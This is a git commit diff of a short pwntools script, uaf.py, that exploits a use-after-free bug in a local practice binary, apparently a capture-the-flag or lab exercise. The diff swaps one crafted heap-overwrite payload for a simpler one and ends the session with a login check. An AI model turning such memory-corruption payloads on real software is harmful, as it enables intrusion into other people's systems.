80e3129beb295a93a8ae180bf325419db8720d5c
ChoKyuWon <yyj10137@gmail.com>
2020-06-18 14:30:45 +0900

    script

--- uaf.py
+++ uaf.py
@@ -4,8 +4,8 @@ target = "use-after-free"
 
 p = process(target)
 
-payload = b"a"*16 + b"user"+b"\x90"*12 +b'\x90'*16 + b"user"+b"\x90"*12 + b'\x01' + b'\x90'*7 + b'\x21'+b'\x90'*7
-
+#payload = b"a"*16 + b"user"+b"\x90"*12 +b'\x90'*16 + b"user"+b"\x90"*12 + b'\x01' + b'\x90'*7 + b'\x21'+b'\x90'*7
+payload = b'a'*64 + b'\x01'*16
 p.recvuntil(">>>")
 p.sendline("login")
 p.recvuntil(':')
@@ -24,4 +24,6 @@ msg_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
 print(del_addr, msg_addr)
 
 #gdb.attach(p)
-p.interactive()
+p.sendline("login")
+print(p.recvuntil(">>>"))
+exit()
